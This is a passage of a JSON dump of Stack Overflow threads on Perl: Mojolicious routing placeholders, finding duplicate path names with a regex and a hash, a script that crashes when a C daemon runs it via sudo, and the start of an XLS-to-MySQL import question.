I do not understand how to combine that with what I have.</p>\n\n<p>I tried to add <code>$foo-&gt;pattern-&gt;placeholder_start('+');</code> to my routing, but still, the pattern is changing and its irrelevant all over again. It doesn't look like its going to disable the dot related to my problem.</p>\n\n<p>I tried implement the pattern method on the <code>$r</code> variable (which is the Mojo's routing - <code>$self-&gt;routes</code>) </p>\n\n<p>Bottom line, I just need to disable the dot placeholder for certain routing or entirely.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["regex", "perl", "logic"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462869764, "post_id": 37133189, "comment_id": 61806054, "body": "Some sample data and desired output will make this question easier to answer. Also - single char variable names are nasty."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462869920, "post_id": 37133189, "comment_id": 61806150, "body": "It looks like you&#39;re trying to iterate each element of the array, select some data via pattern match, and then count dupes. Is that correct?"}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462870251, "post_id": 37133189, "comment_id": 61806357, "body": "yes Im trying to achieve this based on the pattern."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462870288, "post_id": 37133189, "comment_id": 61806379, "body": "And the desired output given the above? Just flagging those two lines as &#39;duplicates&#39;?"}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462870894, "post_id": 37133189, "comment_id": 61806736, "body": "that just an example, above example,  <b>cdtproject</b> is also as duplicate"}], "answers": [{"comments": [{"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462871260, "post_id": 37133425, "comment_id": 61806963, "body": "use of uninitialized calue $val in hash element of project2.pl like 10, &lt;$FH&gt; wht is this error mean"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462871667, "post_id": 37133425, "comment_id": 61807238, "body": "Means you have a line that doesn&#39;t match. Add an <code>or next</code> after the match (code edited)."}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462872092, "post_id": 37133425, "comment_id": 61807546, "body": "thx, my file contain space, i think it should be chomp. May be this is the easier way to do that.  May i know why before variable my contain %"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462872145, "post_id": 37133425, "comment_id": 61807583, "body": "Because <code>%seen</code> is a hash, that lets you store key-values. Don&#39;t need <code>chomp</code> here, space is valid within a hash key."}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462872524, "post_id": 37133425, "comment_id": 61807838, "body": "Am i correct? if we are using hash, the result will only show once? why do not use array ?"}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462957969, "post_id": 37133425, "comment_id": 61852244, "body": "may i know how to use double looping loop through my list to count the same line"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462958513, "post_id": 37133425, "comment_id": 61852599, "body": "If you can explain what you <i>actually want</i> then I can give you a more specific answer. Looping twice is unnecessary. If you want a count, you can <code>use Data::Dumper; print Dumper \\%seen;</code>"}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462958918, "post_id": 37133425, "comment_id": 61852874, "body": "i see, because double looping is the concept that i able to think. I&#39;m new for perl, just a week."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462959209, "post_id": 37133425, "comment_id": 61853037, "body": "We still can&#39;t give you an answer, without knowing what your desired result actually is. Because your code as it stands - doesn&#39;t work. So to &#39;fix&#39; it, we need to know what a correct output would look like."}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462959476, "post_id": 37133425, "comment_id": 61853235, "body": "your example is get the result i want."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462959581, "post_id": 37133425, "comment_id": 61853305, "body": "Then double-looping is an awful solution to the problem. Familiarise yourself with a hash - they&#39;re really awesome, and explained in <a href=\"http://perldoc.perl.org/perldata.html\" rel=\"nofollow noreferrer\"><code>perldata</code></a>"}, {"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1463023252, "post_id": 37133425, "comment_id": 61887785, "body": "by using above hash answer, how should we display the same line number?"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 0, "last_activity_date": 1462871676, "last_edit_date": 1462871676, "creation_date": 1462869990, "answer_id": 37133425, "question_id": 37133189, "link": "https://stackoverflow.com/questions/37133189/perl-count-line-in-double-looping-if-match-regular-expression-plus-1/37133425#37133425", "title": "perl count line in double looping, if match regular expression plus 1", "body": "<p>It looks like you're trying to iterate each element of the array, select some data via pattern match, and then count dupes. Is that correct? </p>\n\n<p>Would it not be easier to:</p>\n\n<pre><code>my %count_of; \nwhile ( &lt;$FH&gt; ) {\n   my (  $val ) = /\\/([^\\/]+)@@/;\n   $count_of{$val}++; \n}\n</code></pre>\n\n<p>And then, for the variables that have more than one (e.g. there's a duplicate):</p>\n\n<pre><code>print join \"\\n\", grep { $count_of{$_} &gt; 1 } keys %count_of; \n</code></pre>\n\n<p>Alternatively, if you're just wanting to play 'spot the dupe':</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy %seen; \nmy $match = qr/\\/([^\\/]+)@@/;\nwhile ( &lt;DATA&gt; ) {\n    my ( $value ) = m/$match/ or next; \n    print if $seen{$value}++; \n}\n\n__DATA__\n/a/b/c/d/code/Debug/atlantis_digital/c/d/code/Debug/atlantis_digital.map@@/main/place.09/2\n/a/b/c/d/code/C5537_mem_map.cmd@@/main/place.09/0\n/a/b/c/d/code/.settings/org.eclipse.cdt.managedbuilder.core.prefs@@/main/4\n/a/b/c/d/code/.project_initial@@/main/2\n/a/b/c/d/code/.project@@/main/CSS5/5\n/a/b/c/d/code/.cproject@@/main/CSS5/10\n/a/b/c/d/code/.cdtproject@@/main/place.09/0\n/a/b/c/d/code/.cdtproject@@/main/place.09/0\n/a/b/c/d/code/.cdtbuild_initial@@/main/2\n/a/b/c/d/code/.cdtbuild@@/main/CSS5/2\n/a/b/c/d/code/.cdtbuild@@/main/CSS5/2\n/a/b/c/d/code/.ccsproject@@/main/CSS5/3\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462957939, "post_id": 37136440, "comment_id": 61852217, "body": "may i know how to use double looping loop through my list to count the same line"}, {"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "reply_to_user": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "edited": false, "score": 0, "creation_date": 1462968005, "post_id": 37136440, "comment_id": 61859324, "body": "I&#39;m not sure what you are asking but if its how to run it, the script reads on STDIN and writes on STDOUT so, if your data is in a file called <code>in.txt</code>, and the script called <code>same.pl</code> you can do this <code>.&#47;same.pl in.txt</code> or <code>cat in.txt | .&#47;same.pl</code>"}], "tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": false, "score": 0, "last_activity_date": 1462877658, "last_edit_date": 1592644375, "creation_date": 1462877658, "answer_id": 37136440, "question_id": 37133189, "link": "https://stackoverflow.com/questions/37133189/perl-count-line-in-double-looping-if-match-regular-expression-plus-1/37136440#37136440", "title": "perl count line in double looping, if match regular expression plus 1", "body": "<p>The problem has been solved by the previous answer - I just want to offer an alternate flavour that;</p>\n<ul>\n<li>Spells out the regex</li>\n<li>Uses the <code>%seen</code> hash to record the line the pattern first appears; to enable</li>\n<li>slightly more detailed reporting</li>\n</ul>\n<h1></h1>\n<pre><code>use v5.12;\nuse warnings;\n\nmy $regex = qr/\n                \\/             # A literal slash followed by\n                (              # Capture to $1 ...\n                   [^\\/]+      #    ... anything that's not a slash\n                )              # close capture to $1\n                @@             # Must be immdiately followed by literal @@\n            /x;\n\nmy %line_num ;\nwhile (&lt;&gt;) {\n    next unless /$regex/ ;\n    my $pattern = $1 ;\n    if ( $line_num{ $pattern } )  {\n        say &quot;'$pattern' appears on lines &quot;, $line_num{ $pattern }, &quot; and $.&quot; ;\n        next ;\n    }\n    $line_num{ $pattern } = $. ;   # Record the line number\n}\n\n# Ran on data above will produce;\n# '.cdtproject' appears on lines 7 and 8\n# '.cdtbuild' appears on lines 10 and 11\n</code></pre>\n"}], "owner": {"reputation": 177, "user_id": 3665851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3HXVo.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/3665851/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 37133425, "answer_count": 2, "score": 0, "last_activity_date": 1462877658, "creation_date": 1462869283, "last_edit_date": 1462873494, "question_id": 37133189, "link": "https://stackoverflow.com/questions/37133189/perl-count-line-in-double-looping-if-match-regular-expression-plus-1", "title": "perl count line in double looping, if match regular expression plus 1", "body": "<p>I open a file by putting the line to an array. Inside this file based on the regular expression that contains a duplicate value. If the regular expression is a match I want to count it. The regular expression may look like this \n<code>$b =~ /\\/([^\\/]+)@@/</code>. I want to match <code>$1</code> value. </p>\n\n<pre><code>    my @array = do \n{\n    open my $FH, '&lt;', 'abc.txt' or die 'unable to open the file\\n';\n    &lt;$FH&gt;;\n};\n</code></pre>\n\n<p>Below is the way I do, it will get the same line in my file. Thank for help. </p>\n\n<pre><code> foreach my $b (@array)\n{\n    $conflictTemp = 0;\n    $b =~ /\\/([^\\/]+)@@/;\n    $b = $1;\n    #print \"$b\\n\";\n    foreach my $c (@array)\n    {\n        $c =~ /\\/([^\\/]+)@@/;\n        $c = $1;\n\n        if($b eq $c)\n        {   \n            $conflictTemp ++;\n            #print \"$b , $c \\n\"\n            #if($conflictTemp &gt; 1)\n            #{\n            #   $conflict ++;\n            #}\n        }\n    }\n}\n</code></pre>\n\n<p>Below is the some sample data, two sentences are duplicates</p>\n\n<pre><code>/a/b/c/d/code/Debug/atlantis_digital/c/d/code/Debug/atlantis_digital.map@@/main/place.09/2\n\n/a/b/c/d/code/C5537_mem_map.cmd@@/main/place.09/0\n\n/a/b/c/d/code/.settings/org.eclipse.cdt.managedbuilder.core.prefs@@/main/4\n\n/a/b/c/d/code/.project_initial@@/main/2\n\n/a/b/c/d/code/.project@@/main/CSS5/5\n\n/a/b/c/d/code/.cproject@@/main/CSS5/10\n\n/a/b/c/d/code/.cdtproject@@/main/place.09/0\n\n/a/b/c/d/code/.cdtproject@@/main/place.09/0\n\n/a/b/c/d/code/.cdtbuild_initial@@/main/2\n\n/a/b/c/d/code/.**cdtbuild@@**/main/CSS5/2\n\n/a/b/c/d/code/.**cdtbuild@@**/main/CSS5/2\n\n/a/b/c/d/code/.ccsproject@@/main/CSS5/3\n</code></pre>\n"}, {"tags": ["c", "perl", "system", "daemon"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462869110, "post_id": 37132768, "comment_id": 61805612, "body": "We need more information than that to be able to answer."}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462869152, "post_id": 37132768, "comment_id": 61805644, "body": "@Sobrique such as  ?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462869557, "post_id": 37132768, "comment_id": 61805909, "body": "Some code. Some error messages. See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> for what makes a good question."}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462870180, "post_id": 37132768, "comment_id": 61806306, "body": "@Sobrique added more info , though I don&#39;t see the importance and how it isi related to the problem , I can not get any error when it crashes.."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462870250, "post_id": 37132768, "comment_id": 61806356, "body": "It&#39;s important and related, because we&#39;re not psychic - we cannot see your system, we don&#39;t know what it&#39;s doing. So in order to have a chance of troubleshooting, we need a detailed explanation of what&#39;s happening and what&#39;s going wrong."}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462870605, "post_id": 37132768, "comment_id": 61806569, "body": "@Sobrique ok , anyway , I put the codee in the main thread"}, {"owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 0, "creation_date": 1462875574, "post_id": 37132768, "comment_id": 61810111, "body": "How do you know the script crashes? What do you mean by &quot;crash&quot;? A segfault? How did you look at the forked process? Have you tried to attach a debugger to the script&#39;s process?"}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 0, "creation_date": 1462877262, "post_id": 37132768, "comment_id": 61811249, "body": "@nwellnhof I assume it crashes , I cant be really sure . what I do know that the perl script runs till the point it need to run the system function because I added some print message to the perl script before the system call. I don&#39;t really know how to check if it has a segfault. I did not attach debugger (don&#39;t know how to ) . I know that the main program started the process because I can see in the process list defunct process under the main program process. I hope you can lead me to a solution ... don&#39;t know where to look for.."}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "edited": false, "score": 0, "creation_date": 1462891152, "post_id": 37132768, "comment_id": 61821898, "body": "Look at the documentation for your system() call and that might answer your question about how to capture any faults."}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "edited": false, "score": 0, "creation_date": 1462891267, "post_id": 37132768, "comment_id": 61821979, "body": "@tale852150 nothing there"}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "edited": false, "score": 0, "creation_date": 1462891960, "post_id": 37132768, "comment_id": 61822570, "body": "This is not a solution to your question but I wanted to post this for you to help in any way I can, especially with regard to my last comment about looking at the system() perldoc documentation.  Use the last code stub shown at the bottom of the perldoc page (see link below) to help determine what may be causing your issue.   <a href=\"http://perldoc.perl.org/functions/system.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/functions/system.html</a>"}, {"owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "reply_to_user": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "edited": false, "score": 0, "creation_date": 1462894439, "post_id": 37132768, "comment_id": 61824319, "body": "@tale852150 thank you , didn&#39;t help though. I found other solution, though I am not sure why it is working.."}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "edited": false, "score": 0, "creation_date": 1462894751, "post_id": 37132768, "comment_id": 61824550, "body": "Well at least it is working now. :-)"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462901797, "post_id": 37143106, "comment_id": 61828696, "body": "Did the daemon close stdout instead of redirecting it to /dev/null?"}], "tags": [], "owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "is_accepted": false, "score": 1, "last_activity_date": 1462894576, "creation_date": 1462894576, "answer_id": 37143106, "question_id": 37132768, "link": "https://stackoverflow.com/questions/37132768/perl-system-call-script-from-c-daemon-causes-to-the-perl-script-to-crash/37143106#37143106", "title": "perl system call script from C daemon causes to the perl script to crash", "body": "<p>So , I found really strange solution , don't know why - but it works..\nin the command argument in the C program, I put my stdout to /dev/null . \nstrange , but works.</p>\n\n<pre><code>char command[2048];\nsprintf(command, \"./run.pl &gt; /dev/null\");\nchar *args[] = {\"sudo\", \"-u\", user, \"bash\",\"-c\",command,NULL};\nexecv(\"/usr/bin/sudo\",args);\n</code></pre>\n"}], "owner": {"reputation": 147, "user_id": 1958295, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dce738831c2712369e3ce16cab9a26b6?s=128&d=identicon&r=PG", "display_name": "Mojo", "link": "https://stackoverflow.com/users/1958295/mojo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462894576, "creation_date": 1462867977, "last_edit_date": 1462870125, "question_id": 37132768, "link": "https://stackoverflow.com/questions/37132768/perl-system-call-script-from-c-daemon-causes-to-the-perl-script-to-crash", "title": "perl system call script from C daemon causes to the perl script to crash", "body": "<p>I'm using CentOS 6.5.\nI have a perl script that inside the script I have system call : \n<code>system(\"echo 1234 &gt; /tmp/1.txt\");</code>\nthe perl script is called by a daemon using <code>execv</code> command.\nthe problem is that when the perl script reaches to this system call ,the script crashes. when looking a the forked proccess I see it .\nI tried to use eval on the system call inside the perl script but it still crashes.\nI have few hosts with the same OS exactly , but this problem happens only on this specific machine.\nWhen running the perl script manually , it works fine.\nThe daemon is running with root, same as all the other hosts I have.\nAny help will be appriciated.</p>\n\n<p>thanks guys.</p>\n\n<p>EDIT :\nThere is no error message or what so ever , if there was some error it was easier.\nany way here is the relevant piece of the code :</p>\n\n<p>Daemon (wrote in C):</p>\n\n<pre><code>char command[2048];\nsprintf(command, \"./run.pl \");\nchar *args[] = {\"sudo\", \"-u\", user, \"bash\",\"-c\",command,NULL};\nexecv(\"/usr/bin/sudo\",args);\n</code></pre>\n\n<p>Perl script (run.pl) :</p>\n\n<pre><code>system(\"echo 1234 &gt; /tmp/1.txt\");\n</code></pre>\n"}, {"tags": ["mysql", "excel", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462865317, "post_id": 37131617, "comment_id": 61803278, "body": "When you say &quot;My XML file&quot; you mean XLS(X), right?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462865431, "post_id": 37131617, "comment_id": 61803350, "body": "Why are you writing to a file first? And you are talking about a table <code>Name</code> and a table <code>Country</code>, but you show one table that has the <i>columns</i> <code>id</code>, <code>Name</code> and <code>Country</code>. I think you&#39;ve got your words mixed up here. What are you trying to do? Please <a href=\"https://stackoverflow.com/posts/37131617/edit\">edit</a> your question and clarify."}, {"owner": {"reputation": 235, "user_id": 2642601, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/e6c5608a430d1611a0bf9b4209d48dbb?s=128&d=identicon&r=PG", "display_name": "user2642601", "link": "https://stackoverflow.com/users/2642601/user2642601"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462866019, "post_id": 37131617, "comment_id": 61803699, "body": "We&#39;ll i&#39;m trying to read and insert the results from the XLS file to MySQL table , the id table should not be a problem cause it&#39;s auto_increment  field  i need only to insert the name and the country from the XLS file."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": 